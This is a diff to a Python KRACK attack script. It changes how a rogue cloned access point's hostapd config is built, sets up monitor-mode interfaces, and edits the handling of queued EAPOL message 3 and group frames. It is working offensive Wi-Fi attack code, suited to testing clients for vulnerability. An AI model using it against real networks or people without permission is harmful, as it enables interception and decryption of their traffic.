@@ -333,6 +333,7 @@ rsn_ptksa_counters={ptksa_counters}
 rsn_gtksa_counters={gtksa_counters}
 
 wmm_enabled={wmmenabled}
+wmm_advertised={wmmadvertised}
 hw_mode=g
 auth_algs=3
 wpa_passphrase={password}"""
@@ -342,11 +343,12 @@ wpa_passphrase={password}"""
 			iface = iface,
 			ssid = self.ssid,
 			channel = self.rogue_channel,
-			wpaver = self.wpavers, # wpa=1 (WPA) wpa=2 (WPA2) wpa=3 (WPA, WPA2)
+			wpaver = self.wpavers,
 			akms = " ".join([akm2str[idx] for idx in self.akms]),
 			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
 			ptksa_counters = (self.capab & 0b001100) >> 2,
 			gtksa_counters = (self.capab & 0b110000) >> 4,
+			wmmadvertised = int(args.group),
 			wmmenabled = self.wmmenabled,
 			password = str(args.password))
 
@@ -537,9 +539,9 @@ class KRAckAttack():
 			else:
 				log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)
 
-			return True # 不轉送封包
+			return True
 
-		return False # 轉送封包
+		return False
 
 	def handle_from_client_pairwise(self, client, p):
 		if args.group: return
@@ -676,6 +678,7 @@ class KRAckAttack():
 						self.sock_rogue.send(p)
 					else:
 						self.sock_rogue.send(p)
+				# Group addressed frames
 				else:
 					self.sock_rogue.send(p)
 
@@ -770,13 +773,18 @@ class KRAckAttack():
 		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
 		log(STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")
 
+		# 1. Remove unused virtual interfaces
+		if self.nic_rogue_mon is None:
+			subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+
 		# 2. Configure monitor mode on interfaces
 		subprocess.check_output(["ifconfig", self.nic_real_mon, "down"])
 		subprocess.check_output(["iwconfig", self.nic_real_mon, "mode", "monitor"])
-		
-		subprocess.check_output(["ifconfig", self.nic_rogue_ap, "down"])
-		subprocess.check_output(["iwconfig", self.nic_rogue_ap, "mode", "managed"])
-		subprocess.check_output(["ifconfig", self.nic_rogue_ap, "up"])
+		if self.nic_rogue_mon is None:
+			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
+			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "managed"])
+			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
+			time.sleep(0.2)
 
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
 		subprocess.check_output(["iwconfig", self.nic_rogue_mon, "mode", "monitor"])
@@ -909,7 +917,7 @@ if __name__ == "__main__":
 	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
 	parser.add_argument("nic_real_clientack", help="Wireless monitor interface that will station on the channel of the target AP.")
 	parser.add_argument("nic_rogue_mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
-	parser.add_argument("nic_rogue_ap", help="Wireless interface that will run a rogue AP using a modified hostapd.")
+	parser.add_argument("nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
 	parser.add_argument("ssid", help="The SSID of the network to attack.")
 	parser.add_argument("password", help="The password of the network to attack.")
 
